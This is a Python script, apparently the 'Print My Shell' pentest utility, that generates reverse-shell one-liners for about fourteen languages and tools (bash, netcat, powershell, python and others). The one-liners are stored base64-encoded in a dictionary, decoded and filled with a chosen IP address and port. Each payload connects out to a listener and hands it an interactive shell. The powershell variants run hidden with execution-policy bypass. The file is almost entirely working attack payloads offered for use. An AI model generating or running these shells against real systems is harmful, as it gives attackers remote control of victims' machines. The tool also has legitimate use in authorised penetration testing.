#!/usr/bin/env python3
import argparse
import base64
import sys

DEFAULT_IP = "10.0.0.1"
DEFAULT_PORT = "1234"

BANNER = r'''
  ___     _     _     __  __        ___ _        _ _ 
 | _ \_ _(_)_ _| |_  |  \/  |_  _  / __| |_  ___| | |
 |  _/ '_| | ' \  _| | |\/| | || | \__ \ ' \/ -_) | |
 |_| |_| |_|_||_\__| |_|  |_|\_, | |___/_||_\___|_|_|
                             |__/ [by Sameera Madushan & Gobidev]                 

'''

'''
- Reverse Shells From - 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
'''
SHELL_DICT = {

    "bash": ['YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=',
             'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY='],

    "perl": [
        'cGVybCAtZSAndXNlIFNvY2tldDskaT0iezB9IjskcD17MX07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidG'
        'NwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe3tvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwi'
        'PiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9fTsn',
        'cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7MH06ezF9Iik7U1RESU'
        '4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3N5c3RlbSRfIHdoaWxlPD47Jw==',
        'Tk9URTogV2luZG93cyBvbmx5CnBlcmwgLU1JTyAtZSAnJGM9bmV3IElPOjpTb2NrZXQ6OklORVQoUGVlckFkZHIsInswfTp7MX0iKTtTVERJTi'
        '0+ZmRvcGVuKCRjLHIpOyR+LT5mZG9wZW4oJGMsdyk7c3lzdGVtJF8gd2hpbGU8Pjsn'],

    "ruby": [
        'cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7MH0iLHsxfSkudG9faTtleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgPCYlZCA+Ji'
        'VkIDI+JiVkIixmLGYsZikn',
        'cnVieSAtcnNvY2tldCAtZSAnZXhpdCBpZiBmb3JrO2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG'
        '9wZW4oY21kLCJyIil7e3xpb3xjLnByaW50IGlvLnJlYWR9fWVuZCc=',
        'Tk9URTogV2luZG93cyBvbmx5CnJ1YnkgLXJzb2NrZXQgLWUgJ2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cy'
        'k7SU8ucG9wZW4oY21kLCJyIil7e3xpb3xjLnByaW50IGlvLnJlYWR9fWVuZCc='],

    "golang": [
        'ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXt7YyxfOj1uZXQuRGlhbCgidGNwIiwiez'
        'B9OnsxfSIpO2NtZDo9ZXhlYy5Db21tYW5kKCIvYmluL3NoIik7Y21kLlN0ZGluPWM7Y21kLlN0ZG91dD1jO2NtZC5TdGRlcnI9YztjbWQuUnVu'
        'KCl9fScgPiAvdG1wL3QuZ28gJiYgZ28gcnVuIC90bXAvdC5nbyAmJiBybSAvdG1wL3QuZ28='],

    "netcat": ['bmMgLWUgL2Jpbi9zaCB7MH0gezF9', 'bmMgLWUgL2Jpbi9iYXNoIHswfSB7MX0=', 'bmMgLWMgYmFzaCB7MH0gezF9',
               'Tk9URTogT3BlbkJTRApybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyB7MH0gezF9ID4'
               'vdG1wL2Y='],

    "ncat": ['bmNhdCB7MH0gezF9IC1lIC9iaW4vYmFzaA==', 'bmNhdCAtLXVkcCB7MH0gezF9IC1lIC9iaW4vYmFzaA=='],

    "powershell": [
        'cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldH'
        'MuVENQQ2xpZW50KCJ7MH0iLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9'
        'O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC'
        '1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRh'
        'IDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiAgPSAkc2VuZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZW5kYnl0ZS'
        'A9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0'
        'ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX19OyRjbGllbnQuQ2xvc2UoKQ==',
        'cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCd7MH0nLHsxfSk7JH'
        'N0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVh'
        'ZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0'
        'NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNl'
        'bmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSU'
        'kpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgp'
        'fX07JGNsaWVudC5DbG9zZSgpIg=='],

    "awk": [
        'YXdrICdCRUdJTiB7e3MgPSAiL2luZXQvdGNwLzAvezB9L3sxfSI7IHdoaWxlKDQyKSB7eyBkb3t7IHByaW50ZiAic2hlbGw+IiB8JiBzOyBzIH'
        'wmIGdldGxpbmUgYzsgaWYoYyl7eyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8JiBzOyBjbG9zZShjKTsgfX0gfX0gd2hp'
        'bGUoYyAhPSAiZXhpdCIpIGNsb3NlKHMpOyB9fX19JyAvZGV2L251bGw='],

    "lua": [
        'Tk9URTogTGludXggb25seQpsdWEgLWUgInJlcXVpcmUoJ3NvY2tldCcpO3JlcXVpcmUoJ29zJyk7dD1zb2NrZXQudGNwKCk7dDpjb25uZWN0KC'
        'd7MH0nLCd7MX0nKTtvcy5leGVjdXRlKCcvYmluL3NoIC1pIDwmMyA+JjMgMj4mMycpOyI=',
        'bHVhNS4xIC1lICdsb2NhbCBob3N0LCBwb3J0ID0gInswfSIsIHsxfSBsb2NhbCBzb2NrZXQgPSByZXF1aXJlKCJzb2NrZXQiKSBsb2NhbCB0Y3'
        'AgPSBzb2NrZXQudGNwKCkgbG9jYWwgaW8gPSByZXF1aXJlKCJpbyIpIHRjcDpjb25uZWN0KGhvc3QsIHBvcnQpOyB3aGlsZSB0cnVlIGRvIGxv'
        'Y2FsIGNtZCwgc3RhdHVzLCBwYXJ0aWFsID0gdGNwOnJlY2VpdmUoKSBsb2NhbCBmID0gaW8ucG9wZW4oY21kLCAiciIpIGxvY2FsIHMgPSBmOn'
        'JlYWQoIiphIikgZjpjbG9zZSgpIHRjcDpzZW5kKHMpIGlmIHN0YXR1cyA9PSAiY2xvc2VkIiB0aGVuIGJyZWFrIGVuZCBlbmQgdGNwOmNsb3Nl'
        'KCkn'],

    "java": [
        'ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpO3AgPSByLmV4ZWMoWyIvYmluL3NoIiwiLWMiLCJleGVjIDU8Pi9kZXYvdGNwL3swfS97MX07Y2F0ID'
        'wmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gXCRsaW5lIDI+JjUgPiY1OyBkb25lIl0gYXMgU3RyaW5nW10pO3Aud2FpdEZvcigpOw=='],

    "socat": ['c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDp7MH06ezF9',
              'c29jYXQgdGNwLWNvbm5lY3Q6e306e30gc3lzdGVtOi9iaW4vc2g='],

    "nodejs": [
        'KGZ1bmN0aW9uKCl7e3ZhciBuZXQ9cmVxdWlyZSgibmV0IiksY3A9cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLHNoPWNwLnNwYXduKCIvYmluL3'
        'NoIixbXSk7dmFyIGNsaWVudD1uZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KHsxfSwiezB9IixmdW5jdGlvbigpe3tjbGllbnQucGlw'
        'ZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO319KTtyZXR1cm4gL2EvO319KSgpOw=='],

    "telnet": ['cm0gLWYgL3RtcC9wOyBta25vZCAvdG1wL3AgcCAmJiB0ZWxuZXQgezB9IHsxfSAwL3RtcC9w'],

    "python": [
        'cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1'
        'NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVw'
        'MihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc='],

    "python3": [
        'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS1'
        '9TVFJFQU0pO3MuY29ubmVjdCgoezB9LHsxfSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAy'
        'KHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWy9iaW4vc2gsLWldKTsnCg==']
}


def get_shell(type: str, ip: str, port: int, args) -> str:
    """Return a reverse shell of a certain type with filled in ip and port"""
    
    # Test if type is in SHELL_DICT
    if type not in SHELL_DICT:
        print(f"Unknown shell type: {type}")
        exit(1)

    if not args.shellonly:
        print(f"\n[>] {type} reverse shell [<]\n")

    # Get shells of type
    reverse_shells = SHELL_DICT[type]
    
    output = ""

    for shell_syntax in reverse_shells:
        formatted_shell = base64.b64decode(shell_syntax).decode('utf-8').format(ip, port)
        if output:
            output += "\n\n"
        output += formatted_shell
        
        # Break after first shell if shellonly is specified
        if args.shellonly:
            break
    
    if not args.shellonly:
        output += "\n"
    return output
        

if __name__ == "__main__":

    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", type=str, help="IP address", dest='ipaddr')
    parser.add_argument("-p", "--port", type=int, help="Port number", dest='portnum')
    parser.add_argument("-t", "--type", type=str, help="Type of the reverse shell to generate", dest='type')
    parser.add_argument("-l", "--list", action="store_true", help="List all available shell types", dest='list')
    parser.add_argument("-a", "--all", action="store_true", help="Generate all the shells", dest='all')
    parser.add_argument("-s", "--shellonly", action="store_true", help="Disables all output other than the first shell of given type",
                        dest="shellonly")

    # Parse arguments
    if sys.argv[1:]:
        args = parser.parse_args()
    else:
        print(BANNER)
        parser.parse_args(args=["--help"])

    # Print banner
    if not args.shellonly:
        print(BANNER)

    # Set ip and port
    ip = DEFAULT_IP
    port = DEFAULT_PORT

    if args.ipaddr or args.portnum is not None:
        ip = args.ipaddr
        port = args.portnum

    # Print shell of type if specified
    if args.type:
        print(get_shell(args.type, ip, port, args))

    # List all available shell types
    if args.list:
        print("\n[>] Available Shells [<]\n")
        for available_shell in SHELL_DICT:
            print(available_shell)
        print()

    # Print all shells if specified
    if args.all:
        for t in SHELL_DICT:
            print(get_shell(t, ip, port, args))
